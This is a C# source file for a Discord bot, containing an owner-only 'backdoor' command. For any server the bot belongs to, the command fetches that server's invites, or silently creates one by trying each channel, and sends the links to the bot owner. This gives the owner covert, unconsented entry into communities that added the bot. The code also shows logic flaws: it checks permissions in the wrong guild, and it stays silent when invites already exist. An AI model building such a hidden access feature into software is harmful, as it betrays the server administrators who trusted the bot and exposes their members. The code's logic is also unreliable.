using System;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;

using Discord;
using Discord.Rest;
using Discord.Commands;
using Discord.WebSocket;

using Pulsar.Core.Utils;
using Pulsar.Core.KixLog;


/*
 *  __________                __       .___                   
 *  \______   \_____    ____ |  | __ __| _/____   ___________ 
 *   |    |  _/\__  \ _/ ___\|  |/ // __ |/  _ \ /  _ \_  __ \
 *   |    |   \ / __ \\  \___|    </ /_/ (  <_> |  <_> )  | \/
 *   |______  /(____  /\___  >__|_ \____ |\____/ \____/|__|   
 *          \/      \/     \/     \/    \/                    
 */
namespace Pulsar.Core.Commands
{
    public class Backdoor : ModuleBase<ShardedCommandContext>
    {
        /*
         * Gives invites to selected server (By ID)
         * 
         * Filters users other than owner
         * Checks for valid server id
         * Finds server
         * Finds all server invites
         * If no invites, cycles through text then voice channels trying to make an invite
         * Sends en embed with a list of invites to channel
         * If unable to manage invites, automatically creates an invite by cycling through channels
         */
        [Command("backdoor"), Summary("Get an invite for a server")]
        public async Task BackdoorCommand(ulong ServerID = 0)
        {
            if (!Checks.IsOwner(Context.User.Id)) return; // Filter other users

            // Check for valid server id
            if (ServerID == 0)
            {
                await Context.Channel.SendMessageAsync($"Sorry {Context.User.Username}, but you need to give a server ID");
                return;
            }
            // Check that Pulsar is in server
            if (Context.Client.Guilds.Where(x => x.Id == ServerID).Count() <= 0)
            {
                await Context.Channel.SendMessageAsync($"Sorry {Context.User.Username}, but {ServerID} is not a valid Server ID");
                return;
            }

            SocketGuild Server = Context.Client.Guilds.Where(x => x.Id == ServerID).FirstOrDefault(); // Select Server from Pulsar's servers
            try
            {
                // If able to Manage Invites
                if (Context.Guild.CurrentUser.GuildPermissions.ManageGuild)
                {
                    IReadOnlyCollection<RestInviteMetadata> Invites = await Server.GetInvitesAsync(); // Fetch all invites

                    if (Invites.Count() <= 0)
                    {
                        bool CreatedInvite = false;

                        // Go through text channels in the server
                        foreach (SocketTextChannel channel in Server.TextChannels)
                        {
                            // If able to create invite, make and then break the loop
                            if (Context.Guild.CurrentUser.GetPermissions(channel).CreateInstantInvite)
                            {
                                await channel.CreateInviteAsync();
                                Invites = null; // Re-set invites
                                Invites = await Server.GetInvitesAsync(); // Re-fetch invites
                                CreatedInvite = true;
                                break;
                            }
                            else { continue; }
                        }

                        // Go through voice channels in the server
                        if (!CreatedInvite)
                        {
                            foreach (SocketVoiceChannel channel in Server.VoiceChannels)
                            {
                                // If able to create invite, make and break the loop
                                if (Context.Guild.CurrentUser.GetPermissions(channel).CreateInstantInvite)
                                {
                                    await channel.CreateInviteAsync();
                                    Invites = null; // Re-set invites
                                    Invites = await Server.GetInvitesAsync(); // Re-fetch invites
                                    CreatedInvite = true;
                                    break;
                                }
                                else { continue; }
                            }
                        }

                        // Return error if no invite was created
                        if (!CreatedInvite)
                        {
                            await Context.Channel.SendMessageAsync("I don't have permissions in that server!");
                            Logger.Log($"[{DateTime.Now} at Backdoor] Failed to create invite for {Server.Name}");
                            return;
                        }

                        // Build embed
                        EmbedBuilder Embed = new EmbedBuilder
                        {
                            Title = $"Invites for {Server.Name} ({Server.Id})",
                            Timestamp = Context.Message.Timestamp
                        };
                        Embed.WithColor(142, 44, 208);

                        int TotalInvites = Invites.Count;
                        int CurrentInvite = 0;
                        // For each invite in server, add field to embed
                        /*
                         * [Invite Link](Link)
                         * Creator: Creator#Discriminator
                         * Code: Invite Code
                         * Uses: Uses
                         * Max Uses: Max Uses
                         */
                        foreach (RestInviteMetadata Invite in Invites)
                        {
                            CurrentInvite++;
                            string MaxUses = Invite.MaxUses.ToString();
                            if (MaxUses == "0") { MaxUses = "Infinite"; } // If Infinite say it's infinite

                            Embed.AddField($"Invite ({CurrentInvite}/{TotalInvites})", $"[Invite Link]({Invite.Url})\n" +
                                                                                       $"Creator: {Invite.Inviter.Username}#{Invite.Inviter.Discriminator}\n" +
                                                                                       $"Code: {Invite.Code}\n" +
                                                                                       $"Uses: {Invite.Uses}\n" +
                                                                                       $"Max Uses: {MaxUses}");
                        }

                        // Send embed
                        await Context.Channel.SendMessageAsync("", false, Embed.Build());
                    }
                }

                // If unable to manage Invites, do it blind
                else
                {
                    bool CreatedInvite = false;
                    IInviteMetadata Invite = null;

                    // Go through text channels in the server
                    foreach (SocketTextChannel channel in Server.TextChannels)
                    {
                        // If able to create invite, make and then break the loop
                        if (Context.Guild.CurrentUser.GetPermissions(channel).CreateInstantInvite)
                        {
                            Invite = await channel.CreateInviteAsync();
                            CreatedInvite = true;
                            break;
                        }
                        else { continue; }
                    }

                    // Go through voice channels in the server
                    if (!CreatedInvite)
                    {
                        foreach (SocketVoiceChannel channel in Server.VoiceChannels)
                        {
                            // If able to create invite, make and break the loop
                            if (Context.Guild.CurrentUser.GetPermissions(channel).CreateInstantInvite)
                            {
                                Invite = await channel.CreateInviteAsync();
                                CreatedInvite = true;
                                break;
                            }
                            else { continue; }
                        }
                    }

                    // If unable to create invite, error
                    if (!CreatedInvite)
                    {
                        await Context.Channel.SendMessageAsync("I don't have permissions in that server!");
                        Logger.Log($"[{DateTime.Now} at Backdoor] Failed to create invite for {Server.Name}");
                        return;
                    }

                    // Build embed
                    EmbedBuilder Embed = new EmbedBuilder
                    {
                        Title = $"Invites for {Server.Name} ({Server.Id})",
                        Timestamp = Context.Message.Timestamp
                    };
                    Embed.WithColor(142, 44, 208);

                    /*
                     * [Invite Link](Link)
                     * Creator: Creator#Discriminator
                     * Code: Invite Code
                     * Uses: Uses
                     * Max Uses: Max Uses
                     */
                    string MaxUses = Invite.MaxUses.ToString();
                    if (MaxUses == "0") { MaxUses = "Infinite"; } // If Infinite say it's infinite

                    Embed.AddField($"Invite (1/1) (Created blindly)", $"[Invite Link]({Invite.Url})\n" +
                                                                      $"Creator: {Invite.Inviter.Username}#{Invite.Inviter.Discriminator}\n" +
                                                                      $"Code: {Invite.Code}\n" +
                                                                      $"Uses: {Invite.Uses}\n" +
                                                                      $"Max Uses: {MaxUses}");

                    // Send embed
                    await Context.Channel.SendMessageAsync("", false, Embed.Build());
                }
            }
            // Catch errors
            catch (Exception error)
            {
                Logger.Log($"[{DateTime.Now} at Backdoor] Error: {error}");
                await Context.Channel.SendMessageAsync("Something went wrong, try again later");
                return;
            }
        }
    }
}
